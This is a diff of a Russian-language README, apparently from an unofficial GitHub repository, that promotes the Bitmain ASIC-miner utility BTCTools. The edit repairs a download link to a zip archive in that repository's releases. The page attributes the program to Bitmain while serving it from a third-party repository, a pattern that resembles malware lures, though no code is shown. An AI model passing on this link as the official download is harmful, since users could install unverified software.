@@ -1,13 +1,13 @@
 # BTCTools - программа для управления асик майнерами (Виндовс/Линукс/МакОС)
 
-![image](https://user-images.githubusercontent.com/atom-miner/btc/blob/main/02.png)
+![image]([https://user-images.githubusercontent.com/atom-miner/btc/blob/main/02.png](https://github.com/atom-miner/btc/blob/main/02.png))
 
-BTC tools – поиск падений хешрейта одна из удобнейших программ для майнинга, благодаря этой программе вы можете найти свой ASIC в сети, что упрощает процесс и затрат времени.
+BTC tools – одна из лучших программ для майнинга, благодаря этой программе вы можете найти свой ASIC в сети, что упрощает процесс и затрат времени.
 
 Программа создаётся усилиями небезызвестного производителя АСИК-майнеров Bitmain. Изначально она предназначалась конкретно для линейки AntMiner, которая являлась наиболее популярной среди добытчиков Bitcoin. Но позднее создатели обновили её, и теперь она подходит для других вариантов ASIC. Облегчение процесса сканирования майнеров Antminer Bitmain.
 
 
-- [ ] [Скачать BTCTools v1.3.3 для Windows/Linux/MacOS]([(https://github.com/atom-miner/btctools/releases/download/1.3.3/BTC.Tools.v1.3.3.with.Asic.zip)]
+- [ ] [Скачать BTCTools v1.3.3 для Windows/Linux/MacOS](https://github.com/atom-miner/btctools/releases/download/1.3.3/BTC.Tools.v1.3.3.with.Asic.zip)
 
 
 ## С помощью BTCTools мы можем:
